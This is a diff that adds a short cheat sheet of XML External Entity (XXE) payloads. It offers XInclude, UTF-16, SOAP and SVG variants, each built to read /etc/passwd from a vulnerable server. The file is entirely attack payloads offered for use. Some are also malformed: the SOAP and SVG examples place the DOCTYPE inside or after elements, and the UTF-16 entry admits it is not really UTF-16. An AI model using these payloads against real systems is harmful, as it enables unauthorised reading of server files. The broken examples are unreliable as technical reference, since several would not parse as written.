@@ -1,0 +1,25 @@
+# XXE Bypasses and Advanced Techniques
+
+# XInclude Attack (Useful when DOCTYPE is blocked)
+<test xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</test>
+
+# Encoding Bypass (UTF-16)
+# (Note: File content should be actual UTF-16, but this string represents the intent)
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+# SOAP XXE
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <soap:Body>
+    <test>&xxe;</test>
+  </soap:Body>
+</soap:Envelope>
+
+# SVG XXE
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+</svg>
